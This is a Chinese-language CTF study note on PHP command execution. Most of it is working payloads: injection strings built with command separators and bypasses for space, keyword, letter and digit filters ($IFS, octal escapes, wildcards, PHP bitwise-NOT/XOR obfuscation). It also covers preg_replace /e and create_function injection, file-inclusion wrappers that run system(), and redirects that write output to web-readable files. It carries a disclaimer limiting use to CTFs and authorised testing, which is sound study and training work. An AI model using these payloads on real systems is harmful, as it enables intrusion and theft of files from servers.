# PHP 命令执行知识点总结

> 参考来源：`WebJD2.md` 中 EZCMD 到 EZCMD_16 约 70%，`PHP命令执行.md` 约 30%。
>
> 适用场景：CTF、靶场、授权测试。真实环境中不要对未授权目标使用命令执行 payload。

## 1. 总体解题流程

遇到 PHP 命令执行题，不要一上来就硬套 payload，先按下面顺序判断。

1. 找入口：看参数最后进入了 `system`、`exec`、`passthru`、`shell_exec`、反引号、`eval`、`preg_replace /e`、`create_function`，还是文件包含函数。
2. 看回显：结果是否直接输出；是否被拼接了 `>/dev/null 2>&1`；`exec` 是否没有输出数组；页面是否需要查看源码。
3. 看过滤：过滤了空格、分号、字母、数字、`cat`、`flag`、通配符、括号、引号，还是只做了 `strpos` / `preg_match` 黑名单。
4. 做信息收集：先拿路径和目录，再读文件。常见动作是 `pwd`、`whoami`、`ls`、`find`、`__FILE__`、`getcwd()`、`scandir()`。
5. 选最短 payload：能直接读就直接读；不能直接回显就写文件；不能用命令名就编码、通配符、取反或异或构造。

## 2. 常见 PHP 执行点

| 类型 | 函数 / 语法 | 特点 | 常见写法 |
| --- | --- | --- | --- |
| 直接命令执行 | `system($cmd)` | 执行系统命令并直接输出 | `system('id');` |
| 直接命令执行 | `passthru($cmd)` | 直接输出原始结果，适合读文件 | `passthru('cat /f*');` |
| 返回字符串 | `shell_exec($cmd)` | 返回完整输出，需要 `echo` | `echo shell_exec('ls');` |
| 返回最后一行 | `exec($cmd)` | 默认不输出，只返回最后一行；第二个参数可收集全部输出 | `exec('ls', $out); print_r($out);` |
| 反引号 | `` `cmd` `` | 等价于 `shell_exec` | `` echo `ls`; `` |
| 管道读取 | `popen($cmd, 'r')` | 以文件流方式读取命令输出 | `$f=popen('ls','r'); echo fread($f,4096);` |
| PHP 代码执行 | `eval($code)` | 执行 PHP 代码，不是直接执行系统命令 | `eval($_GET['qc']);` |
| 旧版本正则执行 | `preg_replace('/.../e', ...)` | `/e` 会把替换结果当 PHP 代码执行，PHP 7 已移除 | `?re=.*&str=${system($_GET[1])}&1=cat /f*` |
| 旧版本匿名函数 | `create_function($args, $body)` | 函数体可被闭合后注入代码，PHP 8 已移除 | `?qc=1;}system('cat /f*');//` |

注意：`assert('php代码')`、`preg_replace /e`、`create_function` 都强依赖 PHP 版本。新环境里这些点可能被废弃或移除，CTF 题里常见是因为题目刻意使用旧版本语法。

## 3. 信息收集和定位 flag

先确定执行环境，再确定文件位置。

```php
?qc=echo __FILE__;
?qc=echo getcwd();
?qc=print_r(scandir('.'));
?qc=print_r(scandir('../../../'));
```

常见 Linux 命令：

```bash
whoami
id
pwd
ls
ls -la
find / -name 'flag*' 2>/dev/null
```

路径判断经验：

| 目标 | 思路 | 示例 |
| --- | --- | --- |
| 当前目录 flag | 直接列目录 | `ls`、`scandir('.')` |
| 上级目录 flag | 逐级向上找 | `../../../flag` |
| 根目录 flag | 通配符读 | `/f*`、`/flag*` |
| 文件名被部分过滤 | 用 `?` 或 `*` | `fla?`、`/f*` |
| PHP 源码中的 flag | 读文件后看源码 | `file_get_contents('flag.php')` 后 Ctrl+U |

## 4. 读文件命令替代

`cat` 被过滤时，不要卡死在 `cat` 上。读文件命令很多，优先按过滤情况换。

| 命令 | 用途 | 示例 |
| --- | --- | --- |
| `cat` | 正常读取 | `cat /flag` |
| `tac` | 倒序读取，可绕过 `cat` | `tac /flag` |
| `nl` | 带行号输出 | `nl /flag` |
| `more` / `less` | 分页读取 | `more /flag` |
| `head` / `tail` | 读头部或尾部 | `head /flag` |
| `od` / `xxd` | 十六进制读取 | `xxd /flag` |
| `base64` | 编码输出后再解码 | `base64 /flag` |
| `strings` | 提取可见字符串 | `strings /flag` |

组合技巧：

```bash
ls | xargs cat
ls|xargs cat
```

`xargs` 会把标准输入中的文件名转换成命令参数。比如 `ls` 输出 `flag.php`，经过 `xargs cat` 后就相当于执行 `cat flag.php`。

## 5. 命令拼接、截断和无回显

### 5.1 命令分隔符

| 符号 | 作用 | 典型用途 |
| --- | --- | --- |
| `;` | 顺序执行，前后命令都执行 | `127.0.0.1;cat /flag` |
| `&&` | 前一个命令成功才执行后一个 | `ls / && cat /f*` |
| `||` | 前一个命令失败才执行后一个 | `aaa || cat /f*` |
| `|` | 管道，前者输出作为后者输入 | `ls|xargs cat` |
| `` `cmd` `` | 先执行内部命令，再替换结果 | `` echo `ls|xargs cat`; `` |
| `$(cmd)` | 现代命令替换写法 | `echo $(whoami)` |
| `#` | Shell 注释，URL 中写 `%23` | `cat /flag%23` |

如果代码类似：

```php
system($cmd . " >/dev/null 2>&1");
```

说明程序把标准输出和标准错误都丢进了 `/dev/null`。可以尝试用命令分隔符让真正的读取命令在重定向之前执行，或者用 `#` 注释掉后面拼接的重定向。

```bash
cat /flag;
cat /flag%23
```

### 5.2 无回显处理

无回显时，优先考虑把结果写入 Web 可访问文件，或换成能直接输出的函数。

```bash
cat /f* > 1.txt
cat /f* >> 1.txt
cat /f* > 1.txt 2>&1
ls|xargs cat >> 1.txt
```

符号含义：

| 符号 | 含义 |
| --- | --- |
| `>` | 覆盖写入文件 |
| `>>` | 追加写入文件 |
| `2>&1` | 把错误输出也合并到标准输出 |
| `/dev/null` | Linux 黑洞，写进去的内容会被丢弃 |

`exec($cmd)` 如果只传一个参数，页面通常没有回显。可以：

```php
echo exec('id');
exec('id', $out, $code); print_r($out);
```

## 6. 空格过滤绕过

空格被过滤是最常见的限制。常见替代如下。

| 绕过方式 | 示例 | 说明 |
| --- | --- | --- |
| URL 编码制表符 | `cat%09/f*` | `%09` 是 tab，Shell 可当分隔符 |
| 换行符 | `cat%0a/f*` | 某些场景可作为命令分隔或空白 |
| `$IFS` | `cat${IFS}/f*` | Shell 内部字段分隔符，默认包含空格、tab、换行 |
| `$IFS$9` | `cat$IFS$9/f*` | `$9` 为空，用来截断变量名边界 |
| PHP 字符拼接 | `'cat'.chr(32).'/f*'` | 在 `eval` 场景中构造空格 |
| 输入重定向 | `tac</flag` | 不需要写空格 |
| Bash 花括号展开 | `{cat,/flag}` | 展开成两个词：`cat` 和 `/flag` |

注意：`{cat,/flag}` 是 Bash 的花括号展开，不是普通命令分组。真正的 `{ command; }` 分组对空格和分号有严格要求，不能直接当作无空格读文件 payload。

## 7. 关键字和字符过滤绕过

### 7.1 过滤 `cat`

```bash
tac /flag
nl /flag
more /flag
less /flag
head /flag
tail /flag
od -c /flag
xxd /flag
base64 /flag
ca''t /flag
```

`ca''t` 利用了 Shell 字符串拼接特性，两个空字符串会被忽略，最终仍然是 `cat`。

### 7.2 过滤路径或文件名

```bash
cat /f*
cat fla?
cat ../../../f*
```

通配符是 Shell 展开的，不是 `cat`、`nl` 等命令本身的能力。比如 `nl a*` 能成功，是因为 Shell 先把 `a*` 展开成具体文件名，再交给 `nl`。

### 7.3 `escapeshellcmd` 和换行

`escapeshellcmd()` 会对危险字符加反斜杠。遇到换行时，可能形成 `\` + 换行。Shell 会把它当作行延续符，拼成一条完整命令。

例如 POST 原始内容可以写成：

```text
cmd=ca
t /fl
ag
```

经过转义和 Shell 解析后可能变成：

```bash
cat /flag
```

这类 payload 建议用 Burp、Yakit 等发包工具发送，浏览器插件有时会自动改写换行。

## 8. 分号过滤和 PHP 语法细节

如果过滤了分号，可以利用 PHP 结束标签 `?>`。PHP 结束标签会隐含结束当前语句。

```php
?qc=passthru('cat /flag.txt')?>
```

不要误以为右花括号 `}` 可以代替语句分号。下面这种在 PHP 中会报语法错误：

```php
if (1) { passthru('cat /flag') }
```

如果要用控制结构绕过滤，需要保证内部语句仍然能合法结束，例如借助 `?>` 结束最后一条语句。

## 9. 无字母、无数字构造

### 9.1 字母被过滤但数字可用

可以用 ANSI-C 风格转义构造命令。格式是 `$'...'`，里面使用八进制。

```bash
$'\143\141\164' $'\57\146\154\141\147\56\164\170\164'
```

上面等价于：

```bash
cat /flag.txt
```

也可以用通配符占位命令或文件名。

```bash
./???/????64 ????.???
```

这种思路依赖路径和文件名可预测，比如 `/bin/base64`、`flag.php`。

### 9.2 数字也被过滤

Shell 中可以用算术展开和变量长度构造数字。

```bash
echo $(())          # 0
echo ${#}           # 0
echo ${##}          # 1
echo $((${##}+${##}))  # 2
echo $((~$(())))    # -1
```

`$(())` 是算术展开；`~` 在算术环境里是按位取反。

### 9.3 从环境变量截取字符

如果不能直接写字母，可以从已有环境变量里截取。

```bash
echo ${PATH:0:1}
echo ${PWD:1:1}
echo ${#PATH}
```

格式：

```bash
${变量名:起始位置:长度}
${#变量名}
```

### 9.4 PHP 取反和异或构造

当 PHP 代码执行点过滤字母和数字时，可以用按位取反 `~` 或异或 `^` 拼出函数名和参数。

变量逃逸思路：

```php
?qc=$_=~%B8%BA%AB;${'_'.$_}[_](${'_'.$_}[__]);&_=system&__=cat /f*
```

核心拆解：

```text
~%B8%BA%AB      => GET
${'_' . $_}     => $_GET
$_GET[_]        => system
$_GET[__]       => cat /f*
最终效果         => system('cat /f*')
```

纯取反也可以直接构造函数名和参数：

```php
?qc=(~'%8c%86%8c%8b%9a%92')(~'%9c%9e%8b%df%d0%99%93%9e%98');
```

异或构造的本质是用两个非字母、非数字字符异或出目标字符。规则是相同为 `0`，不同为 `1`。

## 10. `preg_replace /e` 命令执行

老版本 PHP 中：

```php
preg_replace('/(' . $re . ')/ei', 'strtolower("\\1")', $str);
```

关键点：

1. `/e` 会把替换结果当 PHP 代码执行。
2. `\\1` 会被替换为正则中第一个捕获组匹配到的内容。
3. `re=.*` 可以尽量匹配整段输入。
4. 可以利用 `${...}` 形式触发 PHP 表达式执行。

常见 payload：

```text
?re=.*&str=${phpinfo()}
?re=.*&str=${system($_GET[1])}&1=cat /f*
```

注意：`preg_replace /e` 在 PHP 7 后被移除。遇到现代 PHP 环境时，这条路通常不可用。

## 11. `create_function` 注入

`create_function($args, $code)` 会把第二个参数拼进匿名函数体。若题目代码类似：

```php
create_function('', 'return ' . $_GET['qc'] . ';');
```

可以用 `}` 提前闭合函数体，再执行自己的语句，并用 `//` 注释掉后面的残余内容。

```text
?qc=1;}system('cat /f*');//
```

拼接后大致变成：

```php
return 1;}system('cat /f*');//;
```

利用点是：先让原函数体合法结束，再让注入的 `system` 变成外部可执行代码。

## 12. 文件包含和伪协议

命令执行题里也经常混入文件包含。常见函数：

```php
include $_GET['file'];
require $_GET['file'];
file_get_contents($_GET['file']);
readfile($_GET['file']);
```

常见伪协议：

| 协议 | 用途 | 条件 / 注意 |
| --- | --- | --- |
| `php://filter` | 读取源码并 Base64 编码 | 不需要开启远程包含 |
| `php://input` | 包含 POST 原始数据执行 PHP | 通常需要 `allow_url_include=On` |
| `data://text/plain,` | 直接在 URL 内联 PHP 代码 | 通常需要 `allow_url_include=On` |
| `file://` | 读取本地文件 | 可用绝对路径 |
| `zip://` / `phar://` | 读取压缩包或触发特殊利用 | 依赖具体配置 |

读取源码：

```text
?file=php://filter/read=convert.base64-encode/resource=index.php
```

包含执行：

```text
?file=data://text/plain,<?php system('id');?>
```

## 13. 快速对照表

| 过滤 / 场景 | 优先思路 | 示例 |
| --- | --- | --- |
| 无过滤命令执行 | 直接读根目录 flag | `cat /f*` |
| 需要先找路径 | 输出当前文件和扫目录 | `echo __FILE__`、`scandir('../../../')` |
| 空格过滤 | `%09`、`${IFS}`、`<`、`{cat,/flag}` | `cat${IFS}/f*` |
| `cat` 过滤 | 换读文件命令 | `tac /f*`、`nl /f*` |
| 分号过滤 | 用 PHP 结束标签 | `passthru('cat /flag')?>` |
| 无回显 | 写入 Web 文件 | `cat /f* > 1.txt 2>&1` |
| `exec` 无输出 | 接收输出数组或重定向 | `exec('id',$out);print_r($out);` |
| 字母过滤 | ANSI-C 八进制或通配符 | `$'\143\141\164'` |
| 字母数字都过滤 | PHP 取反、异或、变量逃逸 | `~%B8%BA%AB` 构造 `GET` |
| `preg_replace /e` | `${...}` 参数逃逸 | `${system($_GET[1])}` |
| `create_function` | 闭合函数体后注入 | `1;}system('cat /f*');//` |

## 14. 复盘记忆线

PHP 命令执行题的核心不是背单个 payload，而是按限制逐层替换：

```text
能执行什么函数
=> 有没有回显
=> 哪些字符被过滤
=> 如何拿路径
=> 如何读文件
=> 如何绕过最后一个限制
```

一条比较稳的思路是：

```text
system / eval / exec 入口
=> __FILE__ / scandir / ls 定位
=> cat / tac / nl / xargs 读取
=> 空格、分号、字母数字按过滤替换
=> 无回显就写文件或换输出函数
```
